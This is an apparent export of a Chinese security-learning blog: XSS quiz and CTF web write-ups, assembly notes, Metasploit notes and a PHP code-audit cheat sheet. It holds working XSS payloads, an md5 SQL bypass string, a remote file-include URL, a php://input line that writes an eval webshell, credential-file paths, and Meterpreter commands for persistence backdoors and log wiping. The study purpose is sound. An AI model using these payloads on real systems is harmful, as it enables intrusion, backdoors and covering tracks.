1)插入&#09;不可见字符 &quot;&gt;&lt;a href=&quot;javascri&amp;#09;pt:alert(document.domain);&quot;&gt;here&lt;/a&gt;&lt;&quot; 2)将javascript转化成unicode &quot;&gt;&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(document.domain);&quot;&gt;here&lt;/a&gt;&lt;&quot;``` # stage 12 [链接](https://xss-quiz.int21h.jp/stage_no012.php?sid=65e080510facb2594e5a8632a3191081fc9bd4fc) hint: “s/[\x00-\x20\&lt;>\”\’]//g;” `]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验吧web题]]></title>
    <url>%2Fposts%2F761c3e82.html</url>
    <content type="text"><![CDATA[简单的登录题&lt;?php define("SECRET_KEY", '***********');define("METHOD", "aes-128-cbc");error_reporting(0);include('conn.php');function sqliCheck($str)&#123; if(preg_match("/\\\|,|-|#|=|~|union|like|procedure/i",$str))&#123; return 1; &#125; return 0;&#125;function get_random_iv()&#123; $random_iv=''; for ($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); setcookie("iv", base64_encode($iv)); setcookie("cipher", base64_encode($cipher));&#125;function show_homepage()&#123; global $link; if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv']))&#123; $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE["iv"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die("base64_decode('".base64_encode($plain)."') can't unserialize"); $sql="select * from users limit ".$info['id'].",0"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0 or die(mysqli_error($link)))&#123; $rows=mysqli_fetch_array($result); echo 'Hello!'.$rows['username'].''; &#125; else&#123; echo 'Hello!'; &#125; &#125; else&#123; die("ERROR!"); &#125; &#125;&#125;if(isset($_POST['id']))&#123; $id = (string)$_POST['id']; if(sqliCheck($id)) die("sql inject detected!"); $info = array('id'=&gt;$id); login($info); echo 'Hello!';&#125; else&#123; if(isset($_COOKIE["iv"])&amp;&amp;isset($_COOKIE['cipher']))&#123; show_homepage(); &#125; else&#123; echo ''; &#125;&#125;?&gt; aes加密算法 后台登录查看源码可得 &lt;!-- $password=$_POST['password']; $sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0)&#123; echo 'flag is :'.$flag; &#125; else&#123; echo '密码错误!'; &#125; --&gt;``` 可以下url连接，就大概猜到考什么了，做过两三次了， 直接提交 ```bashffifdyop 加了料的报错注入查看源码&lt;!-- $sql="select * from users where username='$username' and password='$password'"; --&gt;]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[16位汇编语言学习笔记]]></title>
    <url>%2Fposts%2F74313cf1.html</url>
    <content type="text"><![CDATA[最近，不知道是心血来潮，还是有点厌倦web,突然想学一学逆向，未知的领域，有点儿神秘，有了一种想探索的欲望，这学期，也挺闲的，就给自己找点事做，学一下逆向，逆向探索之旅，就此开始吧！ 基础知识1.地址总线：cpu是通过地址总线来制定存储单元的。 数据总线：cpu与内存或其他器件之间的数据传送，。 控制总线： cpu对外部器件的控制2.cpu包括运算器、控制器、寄存器等器件运算器进行信息处理寄存器进行信息存储控制器控制各种器件进行工作内部总线连接各种器件，进行数据的传送3.8086cpu的所有寄存器是16位的，存放两个字节。AX、BX、CX 、DX是通用寄存器，用来存放一般的数据AX可分为AH和BL,其他同理。4.字节，记为byte，一个字节有8个bit组成，可以存在8位寄存器中。字：记为word,一个字由连个字节组成，这两个字节分别称为高位字节和低位字节。5.cpu在执行指令时，会认为ah和al是两个不相关的寄存器。在进行数据传送或运算时，要注意指令的两个操作对象的位数应当一致的：mov ax,2000H 正确的。 mov al,2000H 错误的。 6.8086cpu有20位地址总线。物理地址=段地址x16+偏移地址cpu可以使用不同的段地址和偏移地址形成同一个物理地址7.8086cpu有4个段寄存器：CS DS SS ES8.jmp 段地址：偏移地址 功能是用指令中给出的段地址修改CS，偏移地址修改IP.jmp 某一合法寄存器 功能是用寄存器中的值修改ip.9.debug的功能R查看、改变cpu寄存器的内容D查看内存中的内容E改写内容内存中的内容U将内存中的机器指令翻译成汇编指令T执行一天机器指令A以汇编指令的格式在内存中写入一条机器指令 寄存器的内存访问1.字单元，即存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成。2.DS存放要访问数据的段地址，8086cpu不支持将数据直接送入段寄存器。例子：mov bx,1000H mov ds,bx mov al,[0]mov [0], cx 3.栈的push和pop都是以字为单元进行的。4.栈顶的段地址存放在SS中，偏移地址存放在SP中，任意时刻，SS:SP 指向栈顶元素，push指令和pop指令执行时，cpu从ss和sp中得到栈顶的地址。push 寄存器 将一个寄存器中的数据入栈 push 段寄存器 push 内存单元 pop同理 5.8086cpu只记录栈顶，栈空间的大小要我们自己管理 程序1.汇编指令，有对应的机械码的指令，可以被编译为机器指令，最终为cpu执行伪指令：没有对应的机器码，最终不被cpu所执行，由编译器执行（1）一个段的开始和结束段名 segment段名 ends （2）end 是一个汇编程序的结束标记（3）assume将有特定用途的段和相关的段寄存器关联起来即可。2.我们在这里定义（）来表示一个寄存器或一个内存单元中的内容mov ax [bx] bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中inc bx,1 是bx中的内容加1 3.loop指令来实现循环功能，cx中存放循环次数。例子计算2^12：assume cs:code code segment mov ax,2 mov cx,11s:add ax,ax loop s mov ax,4c00h int 21hcode endsend 4.大于9FFF的十六进制数据A000H等，在汇编源程序中，数据不能以字母开头，所以要在前面加0所以汇编程序中要写0A000H5.debug和汇编编译器masm对指令的不同处理：在汇编源程序中，指令mov ax,[0] 被编译器当做指令mov,ax,0 处理6.汇编源程序中以下指令的含义mov al,[0] 将常量0送入al中mov al,ds:[0] 含义：（al）=((ds)*16+0),将内存单元中的数据送入al中mov al,[bx] （al）=((ds)*16+（bx)),将内存单元中的数据送入al中 mov al,ds:[bx] 与mov al,[bx]相同 7.inc ax 在ax中加1dw 0123h,0456h,…… dw定义的数据处于代码段的开始，所以偏移地址为0。 db 'unIX' 相当于 db 66H,6EH,49H,58H 8.[bx+idata] 表示一个内存单元，他的偏移地址为(bx)+idata 也可以写成如下形式：200[bx][bx].200 9.si和di与bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用10.[bx+si]或[bx+di] 表示一个内存单元，它的偏移笛子为（bx）+(si) 数据处理1.bx,si,di,bp:1）在8086cpu中只有bx、si di bp4个寄存器可以用来[]中来进行内存单元的寻址。例子：mov ax,[bx] 正确 mov ax,[cx] 错误 2）在[]中，这4个寄存器可以单个出现，或只能以4中组合出现：bx和si、bx和di、bp和si、bp和di3）只要在[]中使用寄存器bp,而只李宁中没有显性地给出段地址，段地址就默认在ss中2.寄存器寻址方式：直接寻址 寄存器间接寻址 寄存器相对寻址 基址变址寻址 相对基址变址寻址3.指令处理数据的长度1）通过寄存器名指明指令进行的是字操作或者字节操作2）在没有寄存器名存在的情况下，用X ptr 指令内存的长度例子：mov word ptr ds:[0],1 inc word ptr [bx]mov byte ptr ds:[0],1inc byte ptr [bx] 4.div1)除数有8，16位2）被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放如除数为16位，被除数则为32位，默认放在DX和AX中3）结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数例子：div byte ptr ds:[0] 含义：(al)=(ax)/((ds)*16+0)的商 (ah)=(ax)/((ds)*16+0)的余数div word ptr es:[0] 含义：(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商 (dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数 5db 定义字节型数据 ，占用一个字节dw 定义字型数据 ，占用一个字dd 定义双字型数据 ，占用两个字 6.dup用来数据的重复例子：db 3 dup (0) 相当于db 0,0,0 转移指令的原理1.offset 取得标号的偏移地址2.jmp short 标号 转到标号处执行指令 jmp near ptr 标号 实现段内转移 jmp far ptr 标号 实现的是段间转移，又称为远转移jmp word ptr 内存单元 从内存单元地址处开始存放一个字，是转移的目的地址的偏移地址。jmmp dword ptr 内存单元 从内存单元地址处开始存放两个字，高地址处的字是转移目的段地址，低地址处是转移的目的偏移地址jcxz 标号 如果（cx）=0 转移到标号处执行 3.ret指令用栈中的数据，修改ip的内容，从而实现 近转移(ip)=((ss)*16+(sp))(sp)=(sp)+2 retf指令用栈中的数据，修改cs和ip的内容，从而实现远转移(ip)=((ss)*16+(sp))(sp)=(sp)+2(cs)=((ss)*16+(sp))(sp)=(sp)+2 4.1）call 标号 将当前的ip压栈后，转到标号处执行指令(sp)=(sp)-2((ss)*16+(sp))=(ip)(ip)=(ip)+16 位位移 相当于进行push ipjmp near ptr 标号 2）call far ptr 标号 实现的的段间转移(sp)=(sp)-2((ss)*16+(sp))=(cs)(sp)=(sp)-2((ss)*16+(sp))=(ip)(cs)=标号所在段的短地址(ip)=标号在段中的段地址 相当于进行push cs push ipjmp near ptr 标号 3) call 16位reg(sp)=(sp)-2((ss)*16+(sp))=(ip)(ip)=(16位reg) 功能：push IPjmp 16位reg 4)call word ptr 内存单元地址相当于：push Ipjmp word ptr 内存单元地址 5）call dword ptr 内存单元地址相当于：push cspush Ipjmp dword ptr 内存单元地址 5.1)两个相乘的数：两个数相乘，要么8位，要么16位，如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认在AX中，另一个放在16位reg或内存字单元中。2)结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认在DX中存放，低位在AX中放。格式mul regmul 内存单元例子：mul byte ptr ds:[0] 含义：(ax)=(al)*((ds)*16+0)mul word ptr [bx+si+8] 含义：(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位 (dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位 divdw功能：进行不会溢出的除法运算，被除数位dword型，除数为word型，结果为dword型。参数：（ax）=dword型数据的低16位（dx）=dword型数据的高16位（cx）=除数返回：（dx）=结果的高16位，（ax）结果的低16位（cx）=余数7.dtoc功能：将word型数据转变为表示十进制数的字符串，字符串以0位结尾符。参数：(ax)=word型数据ds:si指向字符串的首地址返回：无 标记寄存器1.zf标志：flag的第六位，零标志位，记录相关指令执行后，结果是否为0。为0,zf=1,否则zf=0pf标志：flag的第二位，奇偶标志位。记录相关指令执行后，结果的所有bit位中1的个数是否为偶数，是pf=1,否pf=0sf标志：第七位，符号标志位，记录相关指令执行后，其结果是否为负。负为1，否为0cf标志：第零位，进位标志位。一般情况下，在进行无符号运算的时候它记录了运算结果的最高有效位想更高位的进位值，或从更高位的借位值。of标志：第11位，溢出标志。发生溢出，of=1,否则of=0df标志：第10位，方向标志位.df=0,每次操作后si、di递增；df=1,每次操作后si、di递减。2.adc带进位的的加法指令3.sbb是借位减法指令，它利用了cf位上记录的借位值。4.cmp是比较指令，相当于减法指令，只是不保存结果。5. 指令 含义 检测的相关标志位je 等于则转移 zf=1jne 不等于 zf=0jb 低于 cf=1jnb 不低于 cf=0ja 高于 cf=0或zf=0jna 不高于 cf=1或zf=1 6.movsb相当于((es)*16+(di))=((ds)*16+(si))如果 df=0,则： (si)=(si)+1 (di)=(di)+1否则： (si)=(si)-1 (di)=(di)-1 movsw的功能将ds:si指向的内存字单元中的字送入es:di中，然后根据标志寄存器df的值，将si和di递增2或递减27.rep movsb相当于s：movsb loop s cld指令：将df位置0std指令：将df位置18.pushf将标志寄存器的值压栈，popf是从栈中弹出数据，送入标志寄存器中。 内中断1.内中断的产生：1）除法错误2）单步执行3）执行into指令4）执行int指令2.iret指令的功能用汇编语法描述为：pop IPpop CS popf 3.int nn为中断类型码，引发中断执行过程：1）取中断类型码n2)标志寄存器入栈，IF=0,TF=03)CS、IP入栈4)(IP)=(n4),(CS)=(n4+2)4.端口的读写指令只有两条：in和out5.shl逻辑左移指令shr逻辑右移指令 外中断1.可屏蔽中断是cpu可以不响应的外中断。sti,设置IF=1cli，设置IF=02.键盘的输入断码=通码+80h 参考书籍：https://book.douban.com/subject/25726019/]]></content>
      <categories>
        <category>knowledge</category>
        <category>note</category>
      </categories>
      <tags>
        <tag>knowledge</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit学习小记]]></title>
    <url>%2Fposts%2F49ca178a.html</url>
    <content type="text"><![CDATA[metasploit的基础知识以前一直在使用这个渗透神器，不知道其原理，这次特地借了一本书，来深入理解一下。1.metasploit框架的体系结构 模块Exploit: 渗透攻击模块，一段程序，利用目标的安全漏洞进行攻击。Payload: 攻击载荷模块，在成功完成对目标的一次渗透攻击后，在目标主机上运行，获得需要的访问和行动权限。Auxiliary:包含了一系列的辅助支持模块，包括扫描模块、fuzz测试漏洞发掘模块、网络协议欺骗以及其他模块。Encoder: 编码器模块通常对我们的攻击模块进行代码混淆，来逃过目标安全保护机制的检测。基础库：Ruby扩展(REX)：处理几乎所有的核心功能，如设置网络套接字、网络的连接、格式化和所有其他基本功能。MSF核心：提供了基本的应用编程接口和框架的实际核心。MSF基础：对模块提供了友好的应用编程接口 2.命令use[Auxiliary/Exploit/Payload/Encoder] 选择一个指定的模块并使其开始工作show [auxiliary/exploit/payload/encoder/options] 显示可用的特定功能的模块set [options/payload] 给某个特定的对象赋值 setg [options/payload] 给某个特定的对象赋值的同时设定作用域为全局，在模块进行切换的时候，该对象的值不会改变run 在设定一个辅助模块需要的所有选项之后，启动该模块 exploit 启动一个渗透攻击模块 back 取消当前选择的模块并且退回到上一级命令窗口 info 列出模块的相关信息 search 搜索符合条件的特定模块check 检查摸个特定目标是否易受到攻击 sessions 列出当前可用会话 3.meterpreter的命令4.一次渗透命令sysinfo 收集一些有关目标系统额基本信息getuid 获取当前会话权限 getpid 当前会话所在的进程标识符pid ps 查看所有进程标识符migrate 转换进程 (渗透时建议转换explorer.exe进程pid)getsystem 获取系统权限 download 下载一根目标计算机的文件rmdir 删除一个文件夹 run persistence 运行此模块在目标主机上安装一个后门，实现访问控制持久化 msf&gt;use exploit/multi/handler 与运行persitstence时设置的payload和lport选项一样 run event_manager -c 清除掉目标系统上与渗透测试相关的事件日志 5.数据库的存储和取回结果systemctl start postgresql 启动数据库mysql init 初始化数据库 msf&gt;db_connect 用来与默认数据库之外的数据库交互db_import 用来向数据库导入来自其他扫描工具（如nessus和nmap）的扫描结果db_status 数据库的连接状态db_disconnect 从指定的数据库断开连接db_nmap 用namp尽心扫描，结果保存在数据库里 db_rebuild_cache 用来重新建立缓存，主要目的是使用心的配置替换之前缓存文件中错误或者过时的配置 hosts 显示数据库中存储的主机信息 services 查看数据库中存储的扫描过的主机开启的端口服务 metasploit模块1.ruby语言1.在命令行中定义方法def method_name[([arg [=default]]...[,*arg [,&amp;expr]])]expr end split函数 将一个字符串的值分割为多个连续的变量squeeze函数 将制定的字符串中去除重复的空格to_i 将字符串类型的输入转换成数字to_s 将一个数字转换成字符串2.以被控计算机为跳板在被控制的计算机上meterpreter&gt;run autoroute -s 目标服务器 3.设置永久访问权限meterpreter&gt;run metsvc -A 4.RailGunmeterpreter&gt;irb&gt;&gt;client.railgun.DLLname.function(parameter) 例子：被渗透的系统进入锁定状态&gt;&gt;client.railgun.user32.LockWorkStation() 删除被渗透系统的指定用户第一个参数代表局域网，假如不在同一个网络中，应填写目标系统的NET-BIOS,第二个代表用户 &gt;&gt;client.railgun.netapi.NetUserDel(nil,"qianye") windows api资料5.汇编语言基础寄存器是一种高速的计算机内存组件EAX 用来存储数据和操作数的累加器，大小32EBX 基地寄存器，同时也是一个指向数据的指针ECX 实现循环为目的的计数器EDX 用来保存I/O指针数据寄存器 ESI/EDI 两者都是索引寄存器，用作内存运算时的数据指针ESP 栈指针寄存器,准确地告诉你当前栈顶的位置EBP 栈数据指针寄存器EIP 程序计数器，保存要执行下一条指令的地址SS DS ES CS FS GS 端寄存器，大小为16位 段.data 用来存储已经初始化的数据.bss 用来存储为初始化的数据.text 所有的程序指令都可以在这里定义.global_start 外部可调用的程序_start 主函数程序 Stack 存放变量和数据 数据类型.byte 单字节.ascii 字符串.asciz 以null结尾的字符串.int 32位整形.short 16位整形.float 单精度浮点型.double 双精度浮点型 未完待续 ……]]></content>
      <categories>
        <category>knowledge</category>
        <category>note</category>
      </categories>
      <tags>
        <tag>knowledge</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[审计以及漏洞知识点小整理]]></title>
    <url>%2Fposts%2F8a554d22.html</url>
    <content type="text"><![CDATA[趁着这几天清闲，整理一下常见漏洞的知识，既是给自己梳理一下知识体系，也是给自己留个备忘录，省得记忆差，老是忘却。大都是从书本上搬运而来的，整理不佳，大牛略过，勿喷。 别人的php代码审计知识脑图 通用代码审计思路1.敏感函数回溯参数1敏感函数2非敏感函数: sql查询语句拼接前是否有过滤。查找关键特征：select、insert、update等，结合from、where。寻找漏洞：sql语句中的参数是否有过滤。例如：HTTP_CLIENT_IP和HTTP_X_FORWORDF等获取的ip地址。 2通读全文代码。1.函数集文件，通常命名为functions或者common等关键字，提供其他文件调用的公共函数。2.配置文件。通常命名包含config关键字，包括web程序运行必须的功能性配置选项以及数据库等配置信息。3安全过滤文件。通常命名中有filter、safe、check等关键字，对参数进行过滤，入sql注入和xss过滤,文件路径和执行的系统命令 的参数。4index文件，可以大致了解整个程序的框架和运行的流程、包含到的文件、其中的核心文件。 3.根据功能点定向审计3.1文件上传功能。如文章编辑、资料编辑、头像上传、附件上传，经常出现任意文件上传漏洞。如果没有对文件名进行过滤，还可能存在sql注入。3.2文件管理。 文件名和路径如果直接在参数中传递，可能存在任意文件操作漏洞，利用../或..\跳转。忽略对文件名过滤，还可能存在xss漏洞。3.3登入认证功能。基于cookie和session认证方式，如果cookie没有加salt,可以导致任意文件登入。或者用户名明文直接放在cookie，导致越权漏洞。3.4找回密码功能。 sql注入漏洞1.常见的函数mid()—从文本字段中提取字符SELECT MID(column_name,start[,length]) FROM table_name;column_name 必需。要提取字符的字段。start 必需。规定开始位置（起始值是 1）。length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。 limit()—返回前几条或者中间某几行数据select * from table limit m,n;其m指记录始index0始表示第条记录 n指第m+1条始取n条 concat、concat_ws、group_concatMySQL的concat函数在连接字符串的 时候，只要其中一个是NULL,那么将返回NULL和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULLgroup_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’]) Count()—聚集函数，统计元祖的个数rand()—用于产生一个0~1的随机数floor()—向下取整group by—依据我们想要的规则对结果进行分组length()—返回字符串的长度Substr()—截取字符串 三个参数 （所要截取字符串，截取的位置，截取的长度）sleep() 函数延迟代码执行若干秒。 2.常见注入1 limit注入2图片宽字节注入3cookie注入4post注入5报错注入6布尔盲注7时间盲注8二次注入9order by 注入10密码注入11mysql约束攻击12md5加密注入13mysql失败注入14 header 注入15 二次查询注入16update或insert注入 insert、update和delete报错注入 insert、update和delete时间盲注 一种新的MySQL下Update、Insert注入方法 17SQL带外通道注入 3.编码注入1宽字节注入注入当set character_set_client=gbk 时，很容易存在宽字节注入防范方法3种:a. 在执行查询之前先执行SET NAMES &#39;gbk&#39;,charset_set_client=binary。b.使用mysql_set_charset(&#39;gdk&#39;)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。c.使用pdo方式，在php5.3.6及一下版本需要设置setAttribute(PDO::ATTR_EMULATE_PREPARES,false); 来禁用prepared statements的仿真效果。2二次urldecode注入利用urldecode和rawurldecode函数使用不当 4.sql注入防御1.gpc/runtime魔术引号magic_quotes_gpc 负责对GET、POST、COOKIE的值进行过滤。magic_quotes_runtime负责对从数据库后者文件中获取的数据进行过滤。启用： php4.2.3可以在配置文件和代码的任意地方启用。之后在php.ini、httpd.conf以及.htaccess中开启。2.过滤函数addslashes 和gpc过滤的值一样，即‘、‘’、\、nullmysql_[real_]escape_string 函数 ,即\x00、\n、 \r 、\ 、’ 、’’、 \xla 都是对字符串进行过滤，php4.03以上版本才存在。intval等字符转换。3.PDO prepare预编译 sql注入的一些绕过技巧这里有几篇不错的文章sql注入与防御SQL注入防御与绕过的几种姿势PHP+Mysql注入防护与绕过 xss漏洞跨站脚本攻击（Cross Site Scriptings）,嵌入客户端的恶意脚本代码 ，xss可以盗取用户cookie、黑道网页、改变网页内容。审计时寻找没有被过滤的参数，且这些参数传入到输出函数，关键字：print、print_r、echo、printf、sprintf、die、var_dump、var_export。 1.xss类型1.反射性xss简单的把用户输入的数据反射给游览器，需要诱使用户点击一个恶意链接，才能成功，非持久性。2.存储性xss把用户输入的数据存储在服务器。3.DOMxss实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS 的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。 2.xss的利用1.xss payload构造get和post请求xss钓鱼识别用户的游览器识别用户安装的软件css History Hack获取用户的真实ip2.xss Frameworkattacke apibeffxss-proxy3.xss worm 3.xss的构造XSS现代WAF规则探测及绕过技术XSS过滤绕过速查表 4.xss的防御防御XSS的七条原则XSS 攻击和防御详解附上一篇前端解码顺序 CSRFCross_site request forgery（跨站请求伪造）当我们打开或者登入某个网站后，游览器与网站所存放的服务器将会产生一个会话，在这个会话没有结束时，你就可以利用你的权限对网站进行某些操作。 1.csrf的攻击和防御白帽子挖洞—跨站请求伪造（CSRF）篇各大SRC中的CSRF技巧Cookie-Form型CSRF防御机制的不足与反思 文件操作漏洞1.文件包含漏洞 1.php包含函数： require: 找不到被包含的函数产生致命错误（E_COMPILE_ERROR）,并停止脚本 include: 找不到被包含的文件时只会产生警告（E_WARNING），脚本将继续执行 include_once:和include类似，包含一次，则不会再包含 require_once: 和require类似，包含一次，则不会再包含 本地文件包含 远程文件包含 allow_url_include= off //把off更改为on 2.文件包含漏洞利用 (1)常见敏感信息路径 window系统 c:\boot.ini //查看系统版本 c:\windows\system32\inetsrv\MetaBase.xml //iis配置文件c:\windows\repair\sam //存储windwos系统初次安装的密码c:\Program Files\mysql\my.ini //mysql配置c:\Program Files\mysql\data\mysql\user.MYD //mysql rootc:\windows\php.ini //php配置文件 UNIX/Linux系统/etc/passwd //账户密码/usr/local/app/apache2/conf/httpd.comf //apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/usr/local/app/php5/lib/php.ini //php相关设置/etc/httpd/conf/httpd.conf //apache配置文件/etc/my.cnf //mysql配置文件 （2）远程包含shell 当目标主机allow_url_fopen选项是on,就可以远程包含一句话 http://cfyqy.com/index.php?page=http://www.qianye.com/shell.txt (3)本地包含配合文件上传。 上传一句话图片木马到目标网站服务器，再包含该图片。 (4)使用php封装协议 file:// 访问本地文件系统http:// 访问http(s)网址ftp:// 访问ftp(s)urlsphp:// 访问输入/输出流 zlib:// 压缩流 data:// 数据流 sshs:// Secure Shell2 expect:// 处理交互式的流 glob:// 查找匹配文件路径 使用封装协议可以读取php文件http://cfyqy.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php 写入php文件http://cfyqy.com/index.php?page=php://input post：&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POst['qianye']);?&gt;"?&gt; (5）包含apache 日志文件 访问http://cfyqy.com/&lt;?php phpinfo();?&gt; &lt;&gt; 会被url转码，所以要bp修改一下 。 发现apache的日志文件路径是重点（6）文件包含截断%00截断：受限于GPC和addslashes等函数过滤，php5.3后，前面修复了该问题 利用多个英文句号（.）和反斜杠（/）来截断：window下240个（.）或者240个（./）,linux下2038个（/.）组合不受gpc限制，php5.3之后被修复 问号（?）来伪截断：http://cfyqy.com/1.txt == http://cfyqy.com/1.txt?.php 不受gpc和php版本限制3.jsp包含：(1)静态包含&lt;%@ include file="page.txt" %&gt; jsp语法规定：include指令为静态包含，只允许包含一个已经存在于服务器中的文件，不能使用变量来控制包含某个文件，这意味着使用include指令，将不存在文件包含漏洞(2)动态包含 2.文件读取漏洞审计时：文件读取的函数列表： file_put_contents()、highlight_file()、fopen()、readfile()、fread()、fgetss()、fgets()、parse_ini_file()、show_source()、file()，还可以利用文件包含include()，php输入输出留php://filter来读取函数 3.文件上传漏洞审计时： 上传函数move_uploaded_file()php会对上传的文件创建临时的文件，其目录在php.ini 的upload_tmp_dir中定义，默认为空。linux下会使用tmp目录，windows下回使用c:\windows\tmp目录1.编译器上传漏洞2.绕过文件上传的检查功能%00截断白名单绕过黑名单绕过特殊文件名绕过文件名大小写绕过前端js绕过文件头、content-type绕过3.文件上传漏洞的防御文件上传的目录设置为不可执行判断文件的类型使用随机数改写文件名和文件路径单独设置文件服务器的域名 4.文件解析漏洞1.apache文件解析漏洞2.iis文件解析问题3.php cgi路径解析问题附上一篇文章服务器解析漏洞 5.文件删除漏洞审计时： 常出现的函数unlink() 6.目录遍历漏洞可以使用不同的编码来绕过一些服务端逻辑：%2e%2e%2f 等同于../ %2e%2e 等同于../ ..%2f 等同于../ %2e%2e%5c 等同于../%2e%2e 等同于..\%5c 等同于..\%252e%252e%255c 等同于../ ..%255c 等同于..\and so on. 某些web容器支持的编码方式；..%c0%af 等同于../ ../%c1%9c 等同于 ..\ 代码执行漏洞用户可以通过请求将代码注入到应用中执行审计时： eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()、array_map()等过滤不严、另外还有php的动态函数（$a($b）也是目前出现比较多的1.代码执行函数(1)eval和assert函数(2)preg_replace函数：当$pattern 处存在e修饰符是，$replacement的值会被当成php代码执行。 &lt;?php preg_replace("/\[(.*)\]/e", '\\1',$_GET['str']);?&gt; 意思是从变量中搜索括号[]中间的内容作为第一组结果， ‘\1’代表用第一组结果填充(3)调用函数过滤不严：call_user_func()和array_map()等数十个函数有调用其他函数的功能 ，其中的一个为参数作为要调用的函数名，如果函数名可控，就可以调用意外的函数，还执行代码2.动态代码执行php的函数可以直接由字符串拼接。例子：&lt;?php $_GET['a']($_GET['b'])?&gt; 意思是接受get请求的a参数作为函数，b参数作为函数的参数3.Curly Syntax执行花括号间的代码，并将结果给替换回去例子ls命令列出本地目录的文件&lt;?php $var="qian $&#123;`ls`&#125; ye"?&gt; 4.unserialize()导致代码执行利用条件：1.unserialize()参数用户可以控制2.__destruct()函数或者 __wakeup(0函数存在 命令执行漏洞可以执行的系统或者应用指令的漏洞。审计时：注意system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()等函数1.命令执行函数2.反引号命令执行反引号执行命令调用的是shell_exec()函数3.命令的连接符 &amp;、 &amp;&amp;、 |、||4.命令防注入函数escapeshellcms()过滤整条命令escapeshellarg() 过滤参数 变量覆盖漏洞用户自定义的参数可以替换程序原有的变量值。审计时：注意的函数extract()和parse_str()import_request_variables()1.import_request_variables将get、post、cookie中的变量导入到全局，第二个参数没有指定将导致变量覆盖相当于开启全局变量注册，在php4~4.10和php5~5.40可用，php5.4后被取消2.parse_str()用于解析url的query string3.extract()将变量从数组导入当前的符号表4.register_globals=on变量将自动赋值，不用初始化，php4.20之后默认为off5.$$变量覆盖 逻辑处理漏洞程序逻辑错误导致的 1.等于与存在判断绕过1.in_arrray(）函数判断一个值是否在某个数组中举个例子：/?qianye=1q&lt;?php if(in_array($_GET['qianye'],array(1,2,3,4)))&#123; //执行语句&#125;else&#123; &#125; 2.is_numeric函数当传入参数为hex时直接通过并返回true,而mysql是可以枝江使用hex编码代替字符串明文的。虽然不能直接注入sql语句，但是可能存在二次注入和xss等漏洞隐患。3.双等于和三等于双等于在判断等于之前会先做变量类型转换，而三等于不会 2.越权访问3.支付漏洞4.密码重置漏洞会话认证漏洞1.cookie攻击2.session保持攻击 点击劫持是一种视觉欺骗手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置。 ssrfSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 代码注入客户端所提交的数据未经检查就让web服务器去执行。 1.xml外部实体注入xml可扩展标识语言，主要用来传输数据，而非显示数据。 2.xpath注入xpath即xml路径语言 3.jsonp注入JSON（JavaSript Object Notation）是一种轻量级的数据交换格式 加密算法与随机数常见的加密算法，为分组加密算法和流加密算法两种。分组加密算法基于“分组”进行操作，代表算法有DES、3-DES、 Blowfish、 IDEA 、AES流加密算法，每次只处理一个字节，密钥独立于消息之外，两者通过异或实现加密于解密，代表算法有RC4、ORYX、SEAL 1.Stream Ciper Attack1.Reused Key Attack使用同一个密钥进行多次加密、解密。假设有 密钥C,明文A,明文B,那么，XOR加密可表示为：E(A)=A xor C E(B)=B xor C 密文是知道的，因此容易计算：E(A) xor E(B) =(A xor C ) xor(B xor C )=A xor B 此时只要知道3个便可以推算出剩下一个，密钥C完全不需要。2.Bit-flipping Attack 攻击者在不知道明文的情况下，通过改变密文，使得明文按其需要的方式发生改变的攻击方式。通过E(A) xor E(B) =A xor B 得到A xor E(A) xor B= E(B) 